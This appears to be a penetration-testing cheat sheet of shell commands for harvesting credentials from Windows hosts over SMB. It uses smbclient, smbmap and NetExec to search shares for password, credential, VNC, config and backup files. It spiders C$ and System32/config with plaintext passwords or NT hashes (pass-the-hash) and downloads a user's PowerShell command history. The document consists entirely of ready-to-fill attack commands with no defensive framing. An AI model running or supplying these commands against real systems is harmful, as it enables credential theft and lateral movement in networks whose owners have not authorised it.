# Unix Shell

## 01 - Samba Suite Utils

```
smb: \> recurse on
prompt off

smb: \> ls *pass*.txt
ls *pass*.xml
ls *pass*.ini
*cred*
*vnc*
*.config*
*.bkp
*.bak
*.backup
```

## 02 - SMBMap

```
$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> -F "*pass*\.(txt|xml|ini)"

$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> -F "*(cred|vnc)*"

$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> -F "*\.(config|bkp|bak|backup)"
```

## 03 - NetExec

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --spider "C$" --spider-folder /Windows/System32/config/ --regex "*.(txt|xml|ini|config|bkp|bak|backup)"

$ netexec smb <IP> -u <username> -H <nt_hash> [-d <domain> | --local-auth] --spider "C$" --spider-folder /Windows/System32/config/ --regex "*pass*.(txt|xml|ini)"

$ netexec smb <IP> -u <username> -H <nt_hash> [-d <domain> | --local-auth] --spider "C$" --spider-folder /Windows/System32/config/ --regex "*(cred|vnc)*"
```

```
$ netexec smb -u "<username>" -p "<password>" [-d <domain> | --local-auth] --get-file /Users/<username>/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine/ConsoleHost_history.txt powershell_history.txt

$ netexec smb -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth] --get-file /Users/<username>/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine/ConsoleHost_history.txt powershell_history.txt
```